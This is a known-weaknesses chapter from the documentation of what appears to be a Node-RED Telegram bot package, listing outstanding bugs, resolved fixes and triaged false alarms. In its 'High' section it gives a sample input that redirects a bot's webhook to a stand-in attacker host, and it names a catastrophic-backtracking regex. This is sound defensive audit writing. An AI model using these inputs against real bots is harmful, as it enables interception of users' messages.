# Errors and Weaknesses

This chapter inventories known weaknesses in the codebase as of V17.3.1. It is intentionally honest — anything fixed in V17.2.0 / V17.3.0 / V17.3.1 is listed under "Resolved" with the commit reference; anything still present is listed under "Outstanding" with severity.

The order mirrors how the issues were surfaced during the recent code audits.

## Outstanding

### Critical-adjacent

- **No agent rebuild on fatal failure.** [bot-node.js:628-634](../../telegrambot/nodes/bot-node.js#L628-L634) calls `abortBot` on the bot's `'error'` event and never recreates the bot. The `http.Agent` (or `SocksProxyAgent`) is built once at config-node construction; `restartPolling` reuses the same agent, so when keep-alive sockets go stale (`socket hang up`, `502 Bad Gateway`, prolonged proxy interruption) every retry reuses the dead pool. Result: bot wedges silently until manual redeploy. This is the root cause of issue #442 and the proxy half of #440.
- **Polling-restart timer-stacking.** [bot-node.js:491-501](../../telegrambot/nodes/bot-node.js#L491-L501). Every `polling_error` schedules another 3-second `restartPolling` `setTimeout` with no `pendingTimer` guard. A burst of errors stacks N parallel restarts. Amplifies the agent-rebuild problem above; matches petermeter69's "12 cycles in 3 minutes" / "20-30 cycles in 1.5 hours" debug screenshots in #442.

### High

- **Open `default` case in the sender's per-type switch.** [out-node.js:794-810](../../telegrambot/nodes/out-node.js#L794-L810):
  ```js
  default:
      if (type in telegramBot) {
          telegramBot[type](chatId, msg.payload.content, msg.payload.options || {});
      }
  ```
  Reachable names include `_request`, `_formatSendData`, `setWebHook`, `deleteWebHook`, `stopPolling`, `closeWebHook`. If a flow ever lets external data populate `msg.payload.type`, an attacker could `type:'setWebHook', content:'https://attacker.example/'` to redirect updates, or `type:'_request'` to call arbitrary Bot API endpoints. Trust-boundary debate aside, the cleaner pattern is an explicit allowlist of supported aliases. Listed in [recommendations-for-refactoring.md](recommendations-for-refactoring.md).

- **`useRegex` command-node `new RegExp(command)` is unanchored and ReDoS-prone.** [command-node.js:28](../../telegrambot/nodes/command-node.js#L28). A flow editor can configure `^(a+)+$` and exponentially backtrack on a long input. Editor trust boundary, but worth at least a docs note.

### Medium

- **Silent `.catch` for `setMyCommands` / `deleteMyCommands` / `getWebHookInfo`.** Three sites in `bot-node.js` reduce real failures (rate limit, bad token, transient network) to `node.warn`. Operators rarely watch warnings in production; deploy-critical failures are effectively invisible.
- **`botsByToken` is module-level state.** [bot-node.js:196](../../telegrambot/nodes/bot-node.js#L196). Survives flow redeploys. Removing a config node by JSON-editing `flows.json` (not via the editor) leaves the entry; the next config node with the same token aborts with "already in use".
- **`pendingCommands` / `commandsByLanguage` never trimmed.** Only `unregisterCommand` touches `commandsByNode`. `commandsByLanguage` retains entries for removed nodes and keeps re-sending them to Telegram via `setMyCommands`.
- **`saveDataDir` is not jailed.** [in-node.js:66, 187](../../telegrambot/nodes/in-node.js#L66). Telegram-supplied filenames pass through `bot.downloadFile` — the underlying library determines the final filename. Editor trust boundary; a `path.resolve` + prefix check would harden it.
- **Early-abort config nodes leave method stubs undefined.** If the constructor `return`s at the duplicate-token or missing-token branches (lines ~231, 237), `start`/`stop`/`abortBot` are never assigned. A subsequent control-node "start" against such a config crashes with `TypeError: cfg.start is not a function`.

### Low

- **Zero automated tests.** No `test/`, no `mocha`/`jest`, no `scripts.test`. ESLint is the only quality gate. The pure helpers in `lib/` (`converter`, `queue-manager`, `safe-stringify`) are the obvious starting point.
- **`out-node.js` is one 984-line `switch`.** ~50 case branches, each `.catch(processError).then(processResult)`. Drift between branches has been a recurring bug source (the audio case in V17.2.x lost `processResult` entirely; `sendInvoice` lost `hasContent`; `default` is the open-method issue above).
- **Inconsistent output-key casing.** `converter.js` mixes `chatId`/`messageId` (camelCase) with `from`/`chat`/`option_ids` (snake_case). Changing this would break every downstream flow consuming the documented shape.
- **`startup` event listeners on `RED.events` are not cleaned for aborted config nodes** — minor consequence as the listener references are gone anyway.

## Resolved (V17.2.0 — V17.3.1)

| Area | Severity | Fix commit |
|------|----------|-----------|
| `eval()` of token / usernames / chatids expressions | Critical | `17d7154` (V17.2.0) — see [ADR 0004](adr/0004-safe-expression-evaluator.md) |
| Bot token in duplicate-token abort + polling 401 hint | Critical | `e30114a`, `6cf718d` — see [ADR 0007](adr/0007-no-credential-leakage-in-logs.md) |
| Bot token in `util.inspect` deep dump | High | `6cf718d` |
| Audio send broke per-chat queue (missing `processResult`) | Critical | `a99c0f9` |
| Long-message chunked send dispatched chunks in parallel | Critical | `e8ea1e7` — see [ADR 0008](adr/0008-sequential-chunked-send.md) |
| `bot.off(name)` removed every listener (cross-node deafen) | High | `f419a59` — see [ADR 0005](adr/0005-listener-handle-tracking.md) |
| `update` listener never cleaned on `in-node.stop()` | High | `f419a59` |
| `onReplyToMessage` listeners leaked on close | High | `a7074ca` |
| Control-node restart double-sent + uncancellable timer | High | `48c7193` |
| `queue-manager` sync-throw stranded the chat | High | `dbb6121`, `772c41b` |
| `downloadFile` could hang forever (no timeout) | High | `5ed0b9d` |
| `bot-node.start()` no-op on initial state | High | `42ae99d` |
| `abortBot` raced `deleteWebHook` vs `closeWebHook` | Medium | `0292d9a` |
| `event-node` duplicate `node.status` blocks | Low | `e4db9af` |
| Webhook-success used direct `self.status = 'connected'`, no broadcast | Medium | `5cdbe88` |
| `addressFamily` always set agent family to 0 (instead of leaving unset) | Low | `909b065` |
| `safeStringify` dropped circular keys silently | Low | `16bd622`, `962799d` |
| `command-node` deref of `botMsg.from` crashed on anonymous senders | Medium | `0b9e181` |
| `getPhotoIndexWithHighestResolution` no bounds check on empty array | Medium | `cfe97df` |
| `new_chat_members.user` referenced removed singular `new_chat_member` field | Critical (data) | `65d2bc6` |
| `tough-cookie@~2.5.0` transitive prototype-pollution | Medium (sec) | `6d4f2bb` — see [ADR 0006](adr/0006-tough-cookie-override.md) |
| `env.get`/`flow.get`/`global.get` string results not split into arrays | Medium | `277f32a` |
| Obsolete `NTBA_FIX_319` env-var + misleading FatalError patch comment | Low | `c8b276d` |

## Triaged false alarms

Two items previously suspected but verified not real bugs:

- **`control-node.js` socket TDZ race.** `socket.end()` reference inside the timer callback fires asynchronously *after* `socket` has been assigned synchronously; in practice safe.
- **`command-node.js` `String.prototype.replace(command, '')` regex behaviour.** The first argument is a string, so the replacement is literal — no regex semantics.

Both are documented here so a future audit doesn't re-litigate them.
